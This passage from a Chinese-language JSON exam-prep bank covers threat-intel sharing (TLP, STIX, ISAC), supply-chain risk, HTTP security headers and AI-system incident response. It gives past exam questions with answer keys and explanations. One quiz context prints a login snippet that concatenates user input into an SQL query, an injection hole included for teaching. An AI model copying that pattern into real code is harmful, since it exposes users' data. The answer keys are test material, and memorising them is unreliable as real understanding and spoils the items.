      "建置網路管理系統監控新廠資通訊設備運作狀態，當發生異常時可以主動發出告警通知人員處理",
      "對於無需連接直接其他硬體裝置的使用者，考慮採用精簡型終端機（Thin Client）設備，一致化的操作介於方便總廠資訊室人員處理用戶問題"
     ],
     "answer": [
      1,
      2,
      3
     ],
     "context": "（題組題 3）公司近期另一工業區的新廠房建築物將完工，準備開始進行系統佈建作業，擔任資訊室系統工程師的你必須在工程前先做好資訊與通訊系統的相關規劃作業；目前公司計劃將在新廠建置一條新的生產線，並將生產三課、品管部門與客服部門移到新廠，同時設立 60 人的辦公室，ERP 及 CRM 等資訊系統作業仍將連到既有資訊中心的相關系統上操作。",
     "hint": "逐項判斷：這項功能能否讓總廠安全地遠端管理新廠設備？",
     "explanation": "答案 B、C、D。這是複選題，情境是新廠不設 MIS 人員，總廠要能遠端管理與維護。B 在 UTM 上提供 SSL 或 L2TP VPN，可動態建立加密連線，及時連回新廠網路處理異常，是合理的維運功能。C 建置網路管理系統監控新廠設備狀態，異常時主動告警，合理。D 對不需要連接其他硬體裝置的使用者採用精簡型終端機，統一操作環境，方便總廠人員處理用戶問題，合理。A 要求新廠通訊設備都設定公開 IP 才能提供遠端管理，會讓每台設備直接暴露在網際網路上，增加被攻擊的機會，也不是遠端管理的必要條件，不合理。",
     "source": "108-1 第31題"
    }
   ]
  },
  {
   "id": "1.2-19",
   "section": "1.2",
   "title": "威脅情資與 TLP／ISAC",
   "examHits": 5,
   "examRefs": [
    "115-2 第14題",
    "114-2 第22題",
    "114-1 第20題",
    "113-2 第21題",
    "109-1 第3題"
   ],
   "guidePages": "",
   "inGuide": true,
   "summary": "威脅情資要發揮作用，靠的是跨組織「分享」：有人先看到某種攻擊，其他單位就能提早防範。分享時要有規矩，紅綠燈協定（TLP）就是用顏色標示這份情資「能傳給誰」：RED 限收件者本人（不得再揭露）、AMBER 限於有需要知道的組織內（TLP 2.0 也允許在需要知道的客戶之間）、GREEN 可在特定社群內傳播、CLEAR 無限制（TLP 2.0 以 CLEAR 取代 WHITE）。資料怎麼交換有格式與機制：STIX 是描述情資的格式，TAXII 是傳輸交換的協定。加入哪個 ISAC 要看自己的產業，金融業對口 F-ISAC，醫療衛福對口 H-ISAC。",
   "keyPoints": [
    "看到「情資標示 TLP:AMBER、僅供接收單位內部」→ 只能在組織內有需要知道的人之間使用，不得對外公開、發給媒體或貼到公開平台。",
    "看到「TLP 各色的規定」→ RED 僅限收件者本人；AMBER 限於組織內（TLP 2.0 允許在需要知道的客戶之間）；GREEN 可在特定社群；CLEAR 無揭露限制。「任何狀況都不得」這類絕對說法要留意。",
    "看到「JSON 裡有 type、spec_version、indicator、relationship」→ 這是 STIX 格式；TAXII 是傳輸協定，不是描述內容的格式。",
    "看到「情資分享社群」→ 依產業選：金融機構加入 F-ISAC，醫療衛福領域是 H-ISAC。",
    "看到「資安聯防」→ 關鍵機制是資安情資分享。"
   ],
   "trap": "把 STIX（內容格式）和 TAXII（傳輸機制）混為一談；以及背 TLP 時對 AMBER 的範圍說得太絕對、或忘了 TLP 2.0 已把 WHITE 改成 CLEAR。",
   "quiz": [
    {
     "stem": "某組織從合作單位接收到一份威脅情資通報，內容包含近期觀察到的攻擊行為特徵與相關指標，其中也帶入了 TLP（Traffic Light Protocol）。情資文件中明確標註為 TLP:AMBER，並說明該資訊僅供接收單位內部相關人員進行防護與應變參考，不適合對外公開散布。關於上述情資的使用方式，下列何者正確？",
     "options": [
      "將情資內容納入對外發布的資安報告中",
      "於組織內部資安相關人員間分享，用於防護與應變決策",
      "將情資轉交媒體單位以提高社會警覺",
      "將該情資完整轉發至公開社群平台，提醒其他組織注意"
     ],
     "answer": 1,
     "hint": "TLP 標示決定這份情資能傳給誰；題幹已說明範圍，選項的分享對象必須落在範圍之內。",
     "explanation": "答案 B。情資標為 TLP:AMBER，且說明僅供接收單位內部相關人員防護與應變參考，所以只能在組織內部的資安相關人員之間分享，用於防護與應變決策，B 正確。A 納入對外發布的資安報告、C 轉交媒體、D 完整轉發到公開社群平台，都是把情資散布到組織之外，違反 TLP:AMBER 的限制。",
     "source": "115-2 第14題"
    },
    {
     "stem": "如附圖所示。各地區/領域之電腦緊急應變小組（Computer Emergency Response Team, CERT）與電腦資安事件應變小組（Computer Security Incident Response Team, CSIRT），常透過紅綠燈協定（Traffic Light Protocol, TLP）來促進敏感資訊如威脅情資之分享與有效協作，關於紅綠燈協定之敘述，下列何者「最不正確」？",
     "options": [
      "TLP:RED 僅供收件者本人查閱或聆聽，不得進一步揭露",
      "TLP:AMBER 收件者僅於組織內使用，且任何狀況都不得對客戶散播",
      "TLP:GREEN 收件者可於相關事件的特定社群中散播資訊",
      "TLP:CLEAR 收件者可以將此類資訊散播至任何地方，對揭露沒有限制"
     ],
     "answer": 1,
     "context": "TLP 色碼對照表（TLP color-coding in RGB, CMYK and Hex；欄位為 RGB 字體／RGB 背景／CMYK 字體／CMYK 背景／Hex 字體／Hex 背景）：\nTLP:RED：RGB 字體 R 255、G 43、B 43；RGB 背景 0、0、0；CMYK 字體 C 0、M 83、Y 83、K 0；CMYK 背景 C 0、M 0、Y 0、K 100；Hex 字體 #FF2B2B；Hex 背景 #000000\nTLP:AMBER：RGB 字體 255、192、0；RGB 背景 0、0、0；CMYK 字體 0、25、100、0；CMYK 背景 0、0、0、100；Hex 字體 #FFC000；Hex 背景 #000000\nTLP:GREEN：RGB 字體 51、255、0；RGB 背景 0、0、0；CMYK 字體 79、0、100、0；CMYK 背景 0、0、0、100；Hex 字體 #33FF00；Hex 背景 #000000\nTLP:CLEAR：RGB 字體 255、255、255；RGB 背景 0、0、0；CMYK 字體 0、0、0、0；CMYK 背景 0、0、0、100；Hex 字體 #FFFFFF；Hex 背景 #000000",
     "hint": "回想 TLP 2.0 各顏色的分享範圍，逐項比對每句描述。",
     "explanation": "答案 B。題目問「最不正確」的敘述。依 FIRST 的 TLP 2.0，TLP:AMBER 的收件者可以在自己的組織內，以及在有需要知道的客戶之間分享，並不是「任何狀況都不得對客戶散播」（限制只在組織內的是 TLP:AMBER+STRICT），所以 B 最不正確。A TLP:RED 僅供收件者本人查閱或聆聽，不得進一步揭露，正確。C TLP:GREEN 收件者可在相關事件的特定社群中散播，正確。D TLP:CLEAR 沒有揭露限制，可以散播到任何地方，正確。",
     "source": "114-2 第22題"
    },
    {
     "stem": "情境如附圖所示。鑒於防火牆 EOS 的事件，該公司資安長非常重視事前資通安全情資的蒐集與分析，俾利公司能有足夠的時間來因應突發的資訊安全風險發生。試問有關資安人員對於資通安全情資的蒐集與分析作為，下列哪些正確？",
     "options": [
      "資通安全情資包含使資通系統安全控制措施無效或利用安全漏洞之方法在內",
      "資通安全情資包含資通安全事件造成之實際損害或可能產生之負面影響在內",
      "加入衛生福利部資安資訊分享與分析中心（H- ISAC）平台",
      "加入金融資安資訊分享與分析中心（F-ISAC）平台"
     ],
     "answer": [
      0,
      1,
      3
     ],
     "context": "A 公司為一金融機構（資通安全責任等級 A 級），近期因為駭客攻擊事件頻仍，因此該公司資安長要求內部必須針對目前外在資安環境以及內部資訊資產的變化，重新檢視與評估潛在的風險並於以適切之處理，以確保該公司的資訊安全。",
     "hint": "回想情資分享辦法對情資涵蓋範圍的規定，以及各 ISAC 的服務對象，逐項判斷每句。",
     "explanation": "答案 A、B、D。這是複選題。A 資通安全情資包含使資通系統安全控制措施無效或利用安全漏洞之方法，依資通安全情資分享辦法第 2 條對資通安全情資的列舉，屬於情資的內容範圍，正確。B 資通安全情資也包含資通安全事件造成的實際損害或可能產生的負面影響，正確。D A 公司是金融機構，加入金融資安資訊分享與分析中心（F-ISAC）平台，才是與自身產業對口的情資分享管道，正確。C 衛生福利部資安資訊分享與分析中心（H-ISAC）是醫療衛生領域的平台，不是金融機構的對口，所以不選。",
     "source": "114-1 第20題"
    },
    {
     "stem": "如附圖所示，機關透過威脅情資分享以達到及早預防或應變處理，目前業界針對此等資料交換已發展出多種格式/機制，附圖為惡意程式情資，其所使用格式為下列何項？",
     "options": [
      "CybOX",
      "MAEC",
      "STIX",
      "TAXII"
     ],
     "answer": 2,
     "context": "{\n    \"type\": \"bundle\",\n    \"id\": \"bundle--2a25c3c8-5d88-4ae9-862a-cc3396442317\",\n    \"objects\": [\n        {\n            \"type\": \"indicator\",\n            \"spec_version\": \"2.1\",\n            \"id\": \"indicator--a932fcc6-e032-476c-826f-cb970a5a1ade\",\n            \"created\": \"2014-02-20T09:16:08.989Z\",\n            \"modified\": \"2014-02-20T09:16:08.989Z\",\n            \"name\": \"File hash for Poison Ivy variant\",\n            \"description\": \"This file hash indicates that a sample of Poison Ivy is present.\",\n            \"indicator_types\": [\n                \"malicious-activity\"\n            ],\n            \"pattern\": \"[file:hashes.'SHA-256' = 'ef537f25c895bfa782526529a9b63d97aa631564d5d789c2b765448c8635fb6c']\",\n            \"pattern_type\": \"stix\",\n            \"valid_from\": \"2014-02-20T09:00:00Z\"\n        },\n        {\n            \"type\": \"malware\",\n            \"spec_version\": \"2.1\",\n            \"id\": \"malware--fdd60b30-b67c-41e3-b0b9-f01faf20d111\",\n            \"created\": \"2014-02-20T09:16:08.989Z\",\n            \"modified\": \"2014-02-20T09:16:08.989Z\",\n            \"name\": \"Poison Ivy\",\n            \"malware_types\": [\n                \"remote-access-trojan\"\n            ],\n            \"is_family\": false\n        },\n        {\n            \"type\": \"relationship\",\n            \"spec_version\": \"2.1\",\n            \"id\": \"relationship--29dcdf68-1b0c-4e16-94ed-bcc7a9572f69\",\n            \"created\": \"2020-02-29T18:09:12.808Z\",\n            \"modified\": \"2020-02-29T18:09:12.808Z\",\n            \"relationship_type\": \"indicates\",\n            \"source_ref\": \"indicator--a932fcc6-e032-476c-826f-cb970a5a1ade\",\n            \"target_ref\": \"malware--fdd60b30-b67c-41e3-b0b9-f01faf20d111\"\n        }\n    ]\n}",
     "hint": "回想 CybOX、MAEC、STIX、TAXII 各自的定位與資料結構，對照附圖 JSON 的欄位。",
     "explanation": "答案 C。圖中是 JSON，最外層 type 為 bundle，內含 indicator（指標，以檔案雜湊描述 Poison Ivy）、malware（惡意程式）與 relationship（indicates，說明指標指向該惡意程式），並標示 spec_version 為 2.1，這就是 STIX（結構化威脅資訊表達）格式。A CybOX 是用來描述可觀察事件的語言，後來整併進 STIX 2.x。B MAEC 是惡意程式屬性列舉與特徵描述的格式，不是圖中的結構。D TAXII 是用來交換 STIX 資料的傳輸協定，不是資料格式。",
     "source": "113-2 第21題"
    },
    {
     "stem": "要達成「資安聯防」目標，下列何者機制較為重要？",
     "options": [
      "資安情資分享",
      "公開金鑰基礎建設",
      "分散式滲透測試",
      "開放原始碼"
     ],
     "answer": 0,
     "hint": "回想「資安聯防」的意義，逐項判斷每個機制與它的關係。",
     "explanation": "答案 A。資安聯防的目標是讓各單位互相支援、及早防範，前提是彼此分享所看到的威脅，所以資安情資分享是較重要的機制。B 公開金鑰基礎建設（PKI）處理的是憑證與身分信任，不是聯防的核心。C 分散式滲透測試是測試手法，不是聯防機制。D 開放原始碼是軟體授權與開發方式，與聯防無直接關係。",
     "source": "109-1 第3題"
    }
   ]
  },
  {
   "id": "1.2-20",
   "section": "1.2",
   "title": "供應商與供應鏈風險管理",
   "examHits": 5,
   "examRefs": [
    "115-2 第12題",
    "115-2 第40題",
    "115-1 第26題",
    "113-2 第12題",
    "108-1 第15題"
   ],
   "guidePages": "",
   "inGuide": true,
   "summary": "供應鏈風險出在「你用的東西不是你自己做的」：採購的設備、外包的廠商、開發時引入的開源元件，任何一環有漏洞或被植入惡意程式，都會傳到你身上。管理要在契約上做：採購與維護契約要寫進漏洞處理流程、安全更新機制、事件通報方式與產品生命週期支援；已經驗收完才發現缺漏時，要把更新責任補進維護契約，要求廠商配合改善；軟體要有軟體物料清單（SBOM）知道用了什麼元件，並在 CI/CD 流程中整合靜態與動態測試；使用有已知漏洞的元件（OWASP A9）要從限制可用的元件下手。另外，OWASP Top 10 只涵蓋最常見的漏洞，不是全部，所以驗收不能只看它。軟體掃描碰不到的硬體層威脅，要靠硬體木馬與 RTL 專屬驗證補足。",
   "keyPoints": [
    "看到「驗收完才發現採購文件缺少漏洞處理、更新、通報與生命週期」→ 把設備（安全）更新責任納入維護契約，要求維護廠商配合改善；只補功能測試、教育訓練，都碰不到缺少的安全條款。",
    "看到「第三方開源函式庫漏洞造成供應鏈攻擊」→ 導入 SBOM 管理，並在 CI/CD 整合 SAST／DAST；只信大廠、全部推給開發者、買保險轉移都不是系統性做法。",
    "看到「使用含有已知漏洞的元件（OWASP A9）」→ 從源頭限制可以使用的元件；加密演算法、IPS、關埠都不針對元件本身的漏洞。",
    "看到「為何驗收不只看 OWASP Top 10」→ 因為它只涵蓋最常見的漏洞，並非所有可能的安全問題。",
    "看到「硬體木馬、RTL 階段植入」→ 軟體 SAST 涵蓋不到，要用硬體專屬驗證，加上對第三方 IP 與工具鏈的來源可信度與可追溯管理；防火牆擋 IP 擋不了已在晶片裡的木馬。"
   ],
   "trap": "以為「買信譽好的大廠」或「保險」就能把供應鏈風險消掉，或以為既有的軟體測試工具能涵蓋硬體設計層；另外，採購階段沒寫進去的資安條款，驗收後只能靠契約變更與維護契約補強，要在採購時就寫清楚。",
   "quiz": [
    {
     "stem": "某 CI提供者規劃更新監控系統，採購文件已詳列功能規格、保固年限及教育訓練需求，但未要求廠商提供漏洞處理流程、安全更新機制、事件通報方式或產品生命週期支援資訊。驗收完成後，廠商表示相關內容將依未來維護需求另行討論。身為專案審查委員，下列何者最適合作為改善建議？",
     "options": [
      "將系統功能測試納入年度查核項目，並於維護期間逐步確認安全能力",
      "將設備更新責任納入維護契約內容，並要求維護廠商配合改善措施",
      "將產品生命週期納入採購與契約內容，作為驗收及後續維運依據",
      "將教育訓練及技術移轉納入驗收程序，並要求操作人員完成相關課程"
     ],
     "answer": 1,
     "hint": "注意題幹的時間點與現況，逐項判斷每項建議在這個階段是否可行、能否補上缺少的安全條款。",
     "explanation": "答案 B。題幹中採購文件已詳列功能、保固與教育訓練，卻沒有漏洞處理流程、安全更新機制、事件通報與生命週期支援，驗收完成後廠商還說之後再談。此時採購與驗收已經結束，能約束廠商持續處理安全更新的是維護契約，所以建議把設備更新責任納入維護契約內容，並要求維護廠商配合改善措施，B 是官方答案。C 把產品生命週期納入採購與契約內容、作為驗收依據，方向一般也合理，但本題採購與驗收已完成，官方採 B，官方未說明為何不選 C（本段是依題幹時間點的推論）。A 把功能測試納入年度查核，查的是功能而不是缺少的安全條款。D 把教育訓練與技術移轉納入驗收，與缺少的漏洞處理、更新、通報、生命週期無關。",
     "source": "115-2 第12題"
    },
    {
     "stem": "情境如附圖所示，針對「以AI生成、植入於RTL階段、潛伏觸發的硬體木馬」這類2026年新型態複合威脅，下列哪些是「正確且互補」的縱深防禦與安全測試元件整合作法？",
     "options": [
      "既有的軟體SAST工具可涵蓋HDL / RTL層級的硬體木馬偵測",
      "對第三方設計工具鏈導入 SBOM 與供應商資安評估機制（如 SEMI 的 SSCA），建立來源可信度與可追溯性",
      "導入專屬的硬體木馬 / RTL安全驗證（形式化驗證、未使用邏輯與可疑觸發條件偵測、功能與覆蓋率分析），補足軟體源碼掃描無法涵蓋的層面",
      "在防火牆阻擋已知惡意IP，可防止已植入晶片內的潛伏型木馬被觸發"
     ],
     "answer": [
      1,
      2
     ],
     "context": "2026 年 3 月，在科學園區的「K 半導體」是一家專攻 AI 加速器晶片的 IC 設計公司，客戶涵蓋國防、車用與雲端。某週一清晨，資安團隊告警平台出現一連串異常：公司內部設計驗證 CI/CD 在凌晨向一個從未見過的境外網域發出了多次連線。\n公司資安中心隨即介入，攤開這場整起事件，發現是一場精心設計、橫跨「軟體供應鏈」與「硬體設計鏈」的複合式攻擊活動，發現：\n1. 工程師為加速驗證流程，從開源平台引入 Python 自動化套件，其中一個間接相依套件被植入惡意程式碼進行竊取。\n2. 進一步檢視版本控制庫，發現開發者把某客戶晶圓代工廠的 API 金鑰與 GDSII 簽章憑證直接 hardcoded 在程式碼裡，等同鑰匙插在門上。\n3. 攻擊者透過竊取的憑證，潛入跨國設計協作公司網站，利用只在應用程式執行時才會浮現的 AP 驗證繞過弱點，存取了不該被存取資料。\n4. 最棘手是鑑識團隊在一採用第三方 IP（IP 指 Intellectual Property 矽智財，非網路 IP）模組，發現一段以 AI 生成、潛伏能觸發的 hardware Trojan。被植入在 RTL 設計階段，傳統的軟體源碼掃描完全無法察覺它。\n公司高層要求安全團隊不只「滅火」，更要提出一套整合各類安全測試元件的縱深防禦方案。依據上述事件情境，請回答下列問題：",
     "hint": "題幹說明了這類威脅藏在哪個設計階段、傳統掃描為何看不到；逐項問工具或措施作用的層次碰不碰得到它。",
     "explanation": "答案 B、C。這是複選題，問針對 AI 生成、植入在 RTL 階段、潛伏觸發的硬體木馬，哪些是正確且互補的縱深防禦作法。B 對第三方設計工具鏈導入 SBOM 與供應商資安評估機制，建立來源可信度與可追溯性，是供應鏈管理的有效手段。C 導入專屬的硬體木馬與 RTL 安全驗證（形式化驗證、未使用邏輯與可疑觸發條件偵測、功能與覆蓋率分析），補足軟體源碼掃描涵蓋不到的層面，正確。A 題幹明說傳統軟體源碼掃描完全無法察覺這類硬體木馬，既有軟體 SAST 工具涵蓋不了 HDL／RTL 層級，錯誤。D 在防火牆阻擋已知惡意 IP，無法防止已經植入晶片內部的潛伏型木馬被觸發，錯誤。",
     "source": "115-2 第40題"
    },
    {
     "stem": "情境如附圖所示。身為 S公司的資安事件應變小組（CSIRT）負責人，事後分析確認，攻擊的初始破口來自雲端供應鏈管理（SCM）平台的一個開源函式庫漏洞。為了系統性地處理這類「軟體供應鏈安全」風險，下列何種安全架構規劃實務最為適切？",
     "options": [
      "僅採購有信譽的大廠軟體，並完全信任其安全性",
      "導入軟體物料清單（Software Bill of Materials, SBOM）管理，並在 CI/CD流程中整合靜態與動態應用程式安全測試（SAST/DAST）",
      "要求所有開發人員必須精通安全編碼，並負起全部安全責任",
      "為公司投保高額網路安全險，將所有供應鏈風險完全轉移"
     ],
     "answer": 1,
     "context": "位於新竹科學園區的頂尖半導體設計公司「S 公司」，其核心資產為存放於本地資料中心的 IC 設計藍圖。為加速全球供應鏈協作，公司正在導入一套建構於雲端原生（Cloud-Native）環境的供應鏈管理（SCM）平台。該平台的開發流程採用 CI/CD（持續整合/持續部署）模式，並引入了生成式 AI 工具以輔助工程師撰寫程式碼。某日，公司的資安監控中心（SOC）接獲 AI 驅動的「使用者與實體行為分析（UEBA）」系統警報，指出有異常的大量資料從 IC 設計藍圖伺服器被存取，疑似資料外洩。經初步調查，攻擊者是透過 SCM 平台所使用的一個第三方開源函式庫漏洞（供應鏈攻擊）滲透，並利用一個設定不當的網路存取規則，從雲端環境橫向移動至本地資料中心。",
     "hint": "逐項問：這個做法能否系統性地處理第三方元件帶來的風險？",
     "explanation": "答案 B。事件的初始破口是 SCM 平台使用的開源函式庫漏洞。系統性的作法是導入軟體物料清單（SBOM）管理，清楚掌握用了哪些元件與版本，並在 CI/CD 流程中整合靜態與動態應用程式安全測試（SAST/DAST），在開發與部署階段持續檢測。A 只採購大廠軟體並完全信任，等於放棄驗證，大廠軟體同樣有漏洞。C 要求所有開發人員精通安全編碼並負起全部責任，把風險推給個人，且無法涵蓋第三方元件。D 投保高額網路安全險、把風險完全轉移，保險不會修補漏洞，也無法把風險完全轉移。",
     "source": "115-1 第26題"
    },
    {
     "stem": "對於一家正準備進行採購網站應用程式的公司來說，為什麼應該以自動化漏洞評估系統（Automated Vulnerability Assessment System，AVAS）作為驗收基礎，而不是根據開放式網路應用安全項目（Open Web Application Security Project，OWASP）Top 10 的 10 大弱點項目作為驗收要件？",
     "options": [
      "OWASP Top 10 僅涵蓋最常見的安全漏洞，而不是所有可能的安全問題",
      "OWASP Top 10 較易於實施且成本更低",
      "AVAS 獲得領導者向象中的指標意義",
      "AVAS 僅針對網站應用程式，而 OWASP Top 10 適用於所有類型的軟體"
     ],
     "answer": 0,
     "hint": "回想 OWASP Top 10 的性質與用途，逐項判斷每個理由是否成立。",
     "explanation": "答案 A。採購網站應用程式時，以自動化漏洞評估系統（AVAS）作驗收基礎，而不是只用 OWASP Top 10 的十大弱點項目當驗收要件，理由是 OWASP Top 10 只涵蓋最常見的安全漏洞，並不是所有可能的安全問題。B 說 OWASP Top 10 較易實施、成本較低，那不是改用 AVAS 的理由。C 說 AVAS 獲得領導者的指標意義，與技術判斷無關。D 說 AVAS 僅針對網站應用程式，而 OWASP Top 10 適用所有軟體，說法與事實相反，OWASP Top 10 是針對網站應用程式的風險清單。",
     "source": "113-2 第12題"
    },
    {
     "stem": "在 OWASP Top 10 2017 中，其 A9項目說明使用含有已知漏洞的元件。而在軟體開發時，為減少 A9項目的發生，下列何種作法為佳？",
     "options": [
      "限制可以使用的元件",
      "使用強的加密演算法",
      "使用入侵防禦系統",
      "限制使用的網路埠"
     ],
     "answer": 0,
     "hint": "回想 OWASP 2017 A9 的成因，逐項判斷每個做法能否減少它發生。",
     "explanation": "答案 A。OWASP Top 10 2017 的 A9 是使用含有已知漏洞的元件，要減少發生，應限制可以使用的元件（例如建立核准的元件清單、控管來源與版本並持續更新）。B 使用強的加密演算法保護的是資料機密性，不會讓有漏洞的元件消失。C 使用入侵防禦系統是外圍偵測阻擋，不處理元件本身的已知漏洞。D 限制使用的網路埠是縮小對外暴露面，同樣不針對元件。",
     "source": "108-1 第15題"
    }
   ]
  },
  {
   "id": "1.2-21",
   "section": "1.2",
   "title": "HTTP 標頭與網站強化",
   "examHits": 4,
   "examRefs": [
    "113-2 第32題",
    "113-2 第35題",
    "110-1 第17題",
    "108-1 第17題"
   ],
   "guidePages": "",
   "inGuide": true,
   "summary": "網站安全不只在程式碼，HTTP 標頭也能讓瀏覽器多一道防護。HSTS（HTTP Strict Transport Security）要求瀏覽器日後一律用 HTTPS 連線，沒設定的網站可能被中間人、SSLStrip 把連線降成明文；把 80 埠關掉不能取代它，把 443 關掉更是自毀 HTTPS。X-Frame-Options 防止頁面被嵌入 iframe（點擊劫持）。Access-Control-Max-Age 是 CORS 預檢結果的快取時間、Accept-Encoding 是請求端的壓縮協商，都不是安全防護標頭。API 回應設計上，只回傳呼叫端需要的資料、去掉機敏欄位，能降低驗證被繞過或 token 洩漏後的資料外洩危害。",
   "keyPoints": [
    "看到「沒設定 HSTS」→ 可能遭受 MITM 與 SSLStrip；用停用 80 或 443 埠不能正確修補，應該是設定 HSTS 標頭。",
    "看到「能強化瀏覽器防護的標頭」→ HSTS、X-Frame-Options 是；Access-Control-Max-Age（CORS 快取時間）與 Accept-Encoding（壓縮協商）不是。",
    "看到「API 受保護路徑的資料外洩風險」→ 對 API 回應做適當的去機敏處理（只回需要的欄位），縮小萬一被繞過時的危害。",
    "看到「標頭題問『不能』」→ 逐一判斷它是要求瀏覽器採取防護行為，還是功能性設定。"
   ],
   "trap": "看到標頭名稱就以為是安全標頭：Access-Control-Max-Age 與 Accept-Encoding 看起來有「Access-Control」「Encoding」這類字眼，其實不是安全防護標頭；另外，停用埠不等於設定 HSTS。",
   "quiz": [
    {
     "stem": "在進行網站檢查時，發現其未設定 HTTP Strict Transport Security（HSTS）標頭，請問下列敘述那些較為適切？（複選）",
     "options": [
      "可能遭受中間人攻擊（Man-in-the-Middle，MITM）",
      "可能遭受 SSLStrip 攻擊",
      "可於網站伺服器中停用 Port 80 的服務來修補這問題",
      "可於網站伺服器中停用 Port 443 的服務來修補這問題"
     ],
     "answer": [
      0,
      1
     ],
     "hint": "回想 HSTS 的作用，逐項判斷：缺少它會有什麼風險？選項的修補方式是否可行？",
     "explanation": "答案 A、B。這是複選題，網站未設定 HSTS 標頭。A 沒有 HSTS，使用者透過明文 HTTP 首次連線或被降級時，可能遭受中間人攻擊（MITM），正確。B SSLStrip 正是把 HTTPS 降級成 HTTP 的攻擊，HSTS 就是用來防它的，沒設定就可能遭受，正確。C 停用 80 埠不能取代 HSTS，使用者輸入 http 的連線會直接失敗而不是自動升級，也無法讓瀏覽器強制使用 HTTPS，不算正確的修補。D 停用 443 埠會讓網站失去 HTTPS 服務，只會更糟。",
     "source": "113-2 第32題"
    },
    {
     "stem": "情境如附圖所示。根據所發現的原始碼，如要降低 /api/protected 路徑潛在漏洞而危害資料安全，下列何項措施何者最合適？",
     "options": [
      "提升使用者密碼複雜度設定規則",
      "實做網路層的防火牆保護",
      "對 API 回應適當的去機敏資料處理",
      "執行用戶端行為分析和異常檢測"
     ],
     "answer": 2,
     "context": "你正在協助產品開發單位，對即將上線的電子商務網站進行安全測試，並且於於測試過程中發現一份 JavaScript 原始碼片段（如下圖），請指出這份原始碼所可能含有的安全問題並提供適當修補建議。\n\n// Advanced eCommerce Website User Login JavaScript Code\nfunction authenticateUser(username, password) {\n    const query = \"SELECT * FROM users WHERE username = '\" + username + \"' AND password = '\" + password + \"'\";\n}\n\nfunction logLoginAttempt(username, success) {\n    // Log login attempt, including username and success/failure\n}\n\napp.post('/login', function(req, res) {\n    let username = req.body.username;\n    let password = req.body.password;\n    let isAuthenticated = authenticateUser(username, password);\n\n    logLoginAttempt(username, isAuthenticated);\n    if (isAuthenticated) {\n        res.send('Login successful!');\n    } else {\n        res.send('Login failed!');\n    }\n});\n\nfunction verifyToken(token) {\n    // Verify the token's validity\n}\n\napp.post('/api/protected', function(req, res) {\n    let token = req.headers.authorization;\n    if (!verifyToken(token)) {\n        res.status(401).send('Unauthorized');\n        return;\n    }\n    // Protected API logic here\n});",
     "hint": "讀懂 /api/protected 的程式碼，逐項判斷每項措施能否降低這個路徑造成的資料危害。",
     "explanation": "答案 C。圖中 /api/protected 路徑只靠 verifyToken 檢查 token（函式內容只有註解，實作未顯示），通過後直接執行受保護的 API 邏輯。若驗證被繞過或 token 外洩，回應裡的內容就會直接外流，所以對 API 回應做適當的去機敏處理（只回傳必要欄位、遮罩機敏資料），能直接降低資料外洩的危害，這是本題官方答案。A 提升使用者密碼複雜度，作用在登入功能，與這個路徑的回應內容無關。B 網路層防火牆看不懂應用層的授權與回應內容。D 用戶端行為分析與異常檢測偏向事後偵測，不能降低單次回應造成的洩漏。",
     "source": "113-2 第35題"
    },
    {
     "stem": "下列哪些HTTP Header 標頭之安全性設定，「不」能讓網站與使用者瀏覽器之間有更多的安全防護功能？",
     "options": [
      "HTTP Strict Transport Security",
      "Access-Control-Max-Age",
      "Accept-Encoding",
      "X-Frame-Options"
     ],
     "answer": [
      1,
      2
     ],
     "hint": "逐一回想每個 HTTP 標頭的用途，判斷它是否屬於安全防護標頭。",
     "explanation": "答案 B、C。這是複選題，問哪些標頭「不」能讓網站與瀏覽器之間有更多安全防護。B Access-Control-Max-Age 是 CORS 預檢（preflight）結果可被快取的秒數，屬功能性設定，不是安全防護標頭。C Accept-Encoding 是請求標頭，用來告知伺服器可接受的壓縮編碼，也不是安全防護。A HTTP Strict Transport Security 讓瀏覽器強制以 HTTPS 連線，是安全防護標頭。D X-Frame-Options 控制頁面能否被嵌入框架，防點擊劫持，也是安全防護標頭。",
     "source": "110-1 第17題"
    },
    {
     "stem": "透過安全設定 HTTP Header標頭，能夠使瀏覽器進行相關的限制，讓網站與使用者瀏覽器之間有更多的安全防護。下列哪些 HTTP Header標頭可達上述功能？",
     "options": [
      "HTTP Strict Transport Security",
      "X-Frame-Options",
      "Access-Control-Max-Age",
      "Accept-Encoding"
     ],
     "answer": [
      0,
      1
     ],
     "hint": "逐一回想每個 HTTP 標頭的用途，判斷它是否屬於安全防護標頭。",
     "explanation": "答案 A、B。這是複選題，問哪些 HTTP 標頭可以讓瀏覽器進行相關限制、提升網站與使用者之間的安全。A HTTP Strict Transport Security 要求瀏覽器之後一律用 HTTPS 連線，是安全標頭。B X-Frame-Options 限制頁面被嵌入 iframe，防點擊劫持，是安全標頭。C Access-Control-Max-Age 只是 CORS 預檢結果的快取時間，不是安全防護標頭。D Accept-Encoding 是請求端告知可接受壓縮方式的標頭，與安全防護無關。",
     "source": "108-1 第17題"
    }
   ]
  },
  {
   "id": "1.2-22",
   "section": "1.2",
   "title": "AI 系統防護與應變",
   "examHits": 4,
   "examRefs": [
    "115-2 第17題",
    "115-2 第18題",
    "114-2 第14題",
    "114-1 第31題"
   ],
   "guidePages": "",
   "inGuide": true,
   "summary": "AI 系統被攻擊時，思路和一般事件應變一樣：先遏制當下的外洩，再做根因處理與調查。像 AI Gateway 這種入口，最優先的是針對正在發生的異常（快速查詢、非正常模式的 API Token）立即封鎖，而不是等模型重新訓練，也不是把所有服務一次關掉。AI 的特有風險在「提示詞」、「模型輸出」與「誰能問什麼」：要對輸入做過濾淨化、用 DLP 監控阻擋輸出中的敏感資訊、用 RBAC 限制各主題的存取；傳輸層（Layer 4）防火牆看不到提示詞的內容。檢測時要涵蓋 API 的身分驗證與過度暴露的功能。應變動作也要看效果有沒有被誇大、代價是否合理。",
   "keyPoints": [
    "看到「AI 系統正被外洩」→ 優先在 AI Gateway 針對異常行為與可疑 Token 立即封鎖，先阻止外洩，而不是重新訓練模型或關閉所有 API。",
    "看到「整合 LLM 的內部知識庫」→ 輸入過濾淨化防提示注入、DLP 擋輸出中的敏感資訊、RBAC 限制存取主題；Layer 4 防火牆看不到提示詞內容，不是優先項。",
    "看到「應變動作清單」→ 封鎖可疑 IP 並分析流量、蒐集日誌建立時間線、啟動跨部門 IR 與外洩評估是合理的；說「可完全阻止」「重啟叢集就能清除一切」的是說過頭。",
    "看到「AI 模型的安全檢測」→ 要測 API 的身分驗證與暴露的功能，也要做模型行為分析與實際攻擊途徑測試，不能只做訓練資料完整性或傳統網路檢測。"
   ],
   "trap": "把「一次關掉所有服務」或「重新訓練模型」當成最優先的應變，忽略事件正在進行時要先遏制；以及相信「可完全阻止」這類絕對化的防護說法。",
   "quiz": [
    {
